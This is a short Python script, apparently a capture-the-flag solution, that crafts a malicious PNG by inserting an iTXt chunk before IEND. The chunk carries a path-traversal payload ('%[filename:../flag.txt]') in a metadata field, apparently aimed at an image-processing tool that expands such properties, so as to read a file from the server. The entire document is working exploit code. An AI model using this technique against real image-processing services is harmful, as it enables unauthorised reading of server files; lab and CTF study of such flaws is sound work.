#!/usr/bin/env python3
# make_payload_itxt.py
# Usage: python3 make_payload_itxt.py logo.png out_payload_itxt.png

import sys, struct, binascii

def make_itxt_chunk(keyword, text, compress_flag=0, comp_method=0, language=b'', translated=b''):
    # iTXt format:
    # keyword\0 comp_flag(1) comp_method(1) language\0 translated\0 text
    data = keyword.encode('utf-8') + b'\x00'
    data += bytes([compress_flag]) + bytes([comp_method])
    data += language + b'\x00'
    data += translated + b'\x00'
    data += text.encode('utf-8')
    ctype = b'iTXt'
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", binascii.crc32(ctype + data) & 0xffffffff)
    return length + ctype + data + crc

def insert_before_iend(png_bytes, chunk_bytes):
    marker = b'\x00\x00\x00\x00IEND'
    pos = png_bytes.rfind(marker)
    if pos == -1:
        pos = png_bytes.rfind(b'IEND') - 4
    return png_bytes[:pos] + chunk_bytes + png_bytes[pos:]

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 make_payload_itxt.py logo.png out_payload_itxt.png")
        sys.exit(1)
    inp = sys.argv[1]; out = sys.argv[2]
    with open(inp, "rb") as f:
        b = f.read()
    keyword = "filename:evil"
    payload = "%[filename:../flag.txt]"
    chunk = make_itxt_chunk(keyword, payload, compress_flag=0, comp_method=0, language=b'', translated=b'')
    new = insert_before_iend(b, chunk)
    with open(out, "wb") as f:
        f.write(new)
    print("Wrote", out)

if __name__ == "__main__":
    main()
